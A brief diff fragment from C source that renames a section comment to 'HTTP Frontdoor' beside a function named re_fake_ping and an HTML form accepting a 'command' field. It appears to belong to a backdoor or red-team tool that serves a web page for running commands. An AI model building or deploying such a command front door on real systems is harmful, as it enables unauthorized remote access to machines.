@@ -247,7 +247,7 @@ int re_fake_ping(void){
 }
 
 ////////////////////////////////////////
-////////// Broken ls
+////////// HTTP Frontdoor
 ////////////////////////////////////////
 const char *frontdoor_contents = "<form method=\"GET\">\n"
 "    <p>Command: <input type=\"text\" name=\"command\"></p>\n"
